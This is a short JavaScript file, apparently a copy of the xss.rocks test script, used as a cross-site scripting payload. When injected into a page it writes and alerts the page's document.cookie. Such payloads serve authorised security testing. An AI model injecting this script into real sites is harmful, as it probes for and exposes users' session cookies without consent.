/* the content of file is from https://xss.rocks/xss.js by me for test purposes*/
document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);
